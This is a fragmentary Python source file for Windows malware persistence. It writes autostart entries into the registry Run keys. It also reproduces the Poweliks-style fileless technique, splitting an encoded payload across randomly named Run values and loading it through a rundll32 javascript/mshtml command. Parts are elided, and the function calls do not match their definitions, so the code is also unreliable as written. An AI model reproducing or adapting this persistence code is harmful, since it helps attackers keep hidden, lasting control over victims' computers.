...
def check_registry(marker):
	# Queries Windows registry for key values
	run = r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'
	runkey = []
	i = 0
	try:
		key = OpenKey(HKEY_LOCAL_MACHINE, run, 0, KEY_WRITE)
		while not WindowsError:
		...
		key = OpenKey(HKEY_CURRENT_USER, run, 0, KEY_WRITE)
		while not WindowsError:
			subkey = EnumValue(key, i)
			runkey.append(subkey[1][:len(marker)])
			i += 1
...
def add_registry_startup(bin_path):
	marker = bin_path[:len(os.getenv('TEMP'))]
	HKEY, HK, runkey = check_registry(bin_path,marker)
	run = r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\'
...
def add_javascript_startup(bin_data):
	marker = bin_data[:12]
	HKEY, runkey = check_registry(marker)
	run = r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\'
	# Set autorun key:
	if marker not in runkey:
		...
		bin_data = [encoded[i:i+n] for i in range(0, len(encoded), n)]

		# original poweliks reg script to load encoded js
		whitespace = str('%20') # issue with whitespace in string below
		bin_data = 'C:\\WINDOWS\\system32\\rundll32.exe javascript:"\..\mshtml,runhtmlapplication ";document.write("\74script language=jscript.encode>"+(new"+%s+"activexobject("wscript.shell")).regread("%s\\software\\microsoft\\windows\\currentversion\\run\\")+"\74/script>")' % (whitespace,HK)
		
		#combination of below, one part is b64 decoder, another part grabs all value data from registry and combines it to be decoded:
		...
		for x in range(len(randname)):
			binary_key = OpenKey(HKEY, run, 0, KEY_WRITE)  #HKEY CUR USER/LOCAL Machone
			SetValueEx(binary_key, sorted(randname)[x], 0, REG_SZ, bin_data[x])
			CloseKey(binary_key)
